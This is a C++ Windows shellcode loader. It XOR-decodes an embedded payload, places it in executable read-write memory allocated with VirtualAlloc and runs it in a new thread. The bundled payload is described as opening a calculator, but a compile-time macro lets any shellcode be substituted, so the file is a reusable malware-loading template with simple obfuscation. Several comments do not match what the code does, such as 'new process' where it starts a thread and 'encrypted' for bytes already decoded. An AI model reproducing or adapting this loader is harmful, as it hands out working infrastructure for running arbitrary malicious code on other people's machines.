// This program's goal is to try to create a new process to execute a shellcode that will open a calculator

#include <windows.h>
#include <cstdio>
#include <iostream>

#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/xored_calc.hpp"
#endif


// This function will xor the payload with the key in order to decrypt it
void decrypt_payload(unsigned char* payload, unsigned int payload_size, const unsigned char xor_key)
{
	for (unsigned int i = 0; i < payload_size-1; i+=3)
	{
		payload[i] ^= xor_key;
        std::cout <<  std::hex <<int(payload[i]);
	}
}

int main()
{

#if DEBUG
	printf("Shellcode is located at %p\n", shellcode);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 1 : Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode)/3,
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

    const unsigned char key = '\x54';
    decrypt_payload((unsigned char*) shellcode, sizeof(shellcode), key);
	// Step 2 : Copy the encrypted shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode)/3);

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

#if DEBUG
	printf("Shellcode decrypted\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 4 : Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
